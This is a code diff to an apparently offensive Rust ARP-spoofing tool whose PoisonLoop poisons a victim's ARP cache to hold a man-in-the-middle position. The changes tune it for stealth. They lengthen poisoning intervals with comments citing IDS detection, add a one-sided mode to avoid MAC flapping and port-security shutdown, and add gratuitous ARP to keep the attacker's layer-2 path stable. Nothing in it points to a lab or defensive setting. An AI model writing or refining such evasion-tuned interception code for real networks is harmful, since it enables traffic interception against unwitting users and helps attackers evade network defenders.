@@ -23,16 +23,25 @@
 //
 // The main.rs `spoof_sender` Arc is no longer passed to SpooferEngine at all.
 
-use crate::network::packet::{ArpPoison, ArpRestore};
+use crate::network::packet::{ArpPoison, ArpRestore, GratuitousArp};
 use pnet::datalink::{self, Channel, DataLinkSender, NetworkInterface};
 use pnet::util::MacAddr;
+use std::net::Ipv4Addr;
 use std::time::Duration;
 
 // How often to re-poison the VICTIM's ARP cache (victim → gateway entry).
-const VICTIM_INTERVAL_MS: u64 = 4_000;
+// Default Linux ARP cache timeout is ~60s, so 25s keeps the MITM position
+// fresh without flooding the network (4s was a broadcast-noise / IDS red flag).
+const VICTIM_INTERVAL_MS: u64 = 25_000;
 
 // How often to re-poison the GATEWAY's ARP cache (gateway → victim entry).
-const GATEWAY_INTERVAL_MS: u64 = 8_000;
+// Only used in bidirectional mode; one-sided MITM skips gateway poisoning
+// entirely to avoid MAC flapping at the router.
+const GATEWAY_INTERVAL_MS: u64 = 30_000;
+
+// How often to re-assert our own (IP, MAC) with a gratuitous ARP so the
+// router/switch CAM table keeps a stable layer-2 path to us during spoofing.
+const GARP_INTERVAL_MS: u64 = 120_000;
 
 // Jitter fraction: actual interval = base ± (base * JITTER_FRACTION).
 const JITTER_FRACTION: f64 = 0.20;
@@ -42,6 +51,11 @@ const JITTER_FRACTION: f64 = 0.20;
 pub struct PoisonLoop {
     interface_name: String,
     our_mac: MacAddr,
+    our_ip: Ipv4Addr,
+    /// When true, only the victim is poisoned (one-sided MITM). The gateway is
+    /// never told "victim IP → our MAC", preventing MAC flapping / port-security
+    /// shutdown at managed switches and routers.
+    one_sided: bool,
 }
 
 impl PoisonLoop {
@@ -50,10 +64,18 @@ impl PoisonLoop {
     ///
     /// The `_interval_ms` parameter is retained for API compatibility but
     /// ignored — the constants above are used instead.
-    pub fn new(interface_name: impl Into<String>, our_mac: MacAddr, _interval_ms: u64) -> Self {
+    pub fn new(
+        interface_name: impl Into<String>,
+        our_mac: MacAddr,
+        our_ip: Ipv4Addr,
+        _interval_ms: u64,
+        one_sided: bool,
+    ) -> Self {
         Self {
             interface_name: interface_name.into(),
             our_mac,
+            our_ip,
+            one_sided,
         }
     }
 
@@ -86,20 +108,34 @@ impl PoisonLoop {
         // Send the first poison immediately so the MITM position is
         // established before the first interval fires.
         send_once(&mut *sender, &to_victim.to_bytes(), "initial poison victim");
+        // In one-sided mode we never poison the gateway — doing so would cause
+        // MAC flapping at the router/switch and risk a port-security shutdown.
+        if !self.one_sided {
+            send_once(&mut *sender, &to_gateway.to_bytes(), "initial poison gateway");
+        }
+
+        // Announce our own (IP, MAC) so the router/switch keep a stable
+        // layer-2 path to us while we spoof.
         send_once(
             &mut *sender,
-            &to_gateway.to_bytes(),
-            "initial poison gateway",
+            &GratuitousArp::new(self.our_ip, self.our_mac).to_bytes(),
+            "initial garp self",
         );
 
         let mut victim_count: u64 = 1;
         let mut gateway_count: u64 = 1;
+        let mut garp_count: u64 = 1;
 
         let mut next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
         let mut next_gateway = tokio::time::Instant::now() + jitter(GATEWAY_INTERVAL_MS);
+        let mut next_garp = tokio::time::Instant::now() + jitter(GARP_INTERVAL_MS);
 
         loop {
-            let wake = next_victim.min(next_gateway);
+            let wake = if self.one_sided {
+                next_victim.min(next_garp)
+            } else {
+                next_victim.min(next_gateway).min(next_garp)
+            };
 
             tokio::select! {
                 _ = tokio::time::sleep_until(wake) => {
@@ -119,7 +155,7 @@ impl PoisonLoop {
                         }
                     }
 
-                    if now >= next_gateway {
+                    if !self.one_sided && now >= next_gateway {
                         send_once(&mut *sender, &to_gateway.to_bytes(), "poison gateway");
                         gateway_count += 1;
                         next_gateway = now + jitter(GATEWAY_INTERVAL_MS);
@@ -132,13 +168,31 @@ impl PoisonLoop {
                             );
                         }
                     }
+
+                    if now >= next_garp {
+                        send_once(
+                            &mut *sender,
+                            &GratuitousArp::new(self.our_ip, self.our_mac).to_bytes(),
+                            "garp self",
+                        );
+                        garp_count += 1;
+                        next_garp = now + jitter(GARP_INTERVAL_MS);
+
+                        if garp_count % 3 == 0 {
+                            println!(
+                                "[*] garp self #{} for {} (every ~{}s)",
+                                garp_count, self.our_ip,
+                                GARP_INTERVAL_MS / 1_000
+                            );
+                        }
+                    }
                 }
 
-                // _ = &mut stop_rx => {
-                //     println!("[*] stopping poison for host {}", target.host_id);
-                //     restore(&mut *sender, &target);
-                //     return Ok(());
-                // }
+                _ = &mut stop_rx => {
+                    println!("[*] stopping poison for host {}", target.host_id);
+                    restore(&mut *sender, &target);
+                    return Ok(());
+                }
             }
         }
     }
@@ -255,14 +309,21 @@ mod tests {
 
     #[test]
     fn test_intervals_under_arp_ttl() {
-        assert!(VICTIM_INTERVAL_MS < 30_000);
-        assert!(GATEWAY_INTERVAL_MS < 30_000);
+        // Typical ARP cache timeout is ~60s; our intervals must be well under that
+        assert!(VICTIM_INTERVAL_MS < 60_000);
+        assert!(GATEWAY_INTERVAL_MS < 60_000);
     }
 
     // Verify that PoisonLoop can be constructed without touching the network.
     #[test]
     fn test_new_is_cheap_and_infallible() {
         let mac = pnet::util::MacAddr(0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF);
-        let _loop = PoisonLoop::new("eth0", mac, 0);
+        let _loop = PoisonLoop::new(
+            "eth0",
+            mac,
+            std::net::Ipv4Addr::new(0, 0, 0, 0),
+            0,
+            false,
+        );
     }
 }
